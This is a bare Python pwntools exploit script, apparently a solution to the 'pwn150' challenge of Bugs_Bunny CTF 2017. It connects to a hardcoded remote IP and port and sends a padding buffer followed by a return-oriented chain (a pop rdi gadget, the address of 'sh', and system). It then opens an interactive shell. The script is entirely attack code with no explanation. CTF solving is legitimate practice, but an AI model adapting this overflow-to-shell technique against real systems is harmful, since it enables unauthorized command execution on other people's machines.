#!/usr/bin/python

#Bugs_Bunny CTF 2017

from pwn import *

#r = process("./pwn150")
#raw_input()

r =remote("54.153.19.139",5253)

sh = 0x4003ef
system = 0x4005e0
poprdi = 0x400883

Buff= "AAAAZZZZEEEERRRRTTTTYYYYUUUUIIIIOOOOPPPPQQQQSSSSDDDDFFFFGGGGHHHHJJJJKKKKLLLLMMMMWWWWVVVV"
Buff += p64(poprdi)+p64(sh)+p64(system)

r.sendline(Buff)
r.interactive()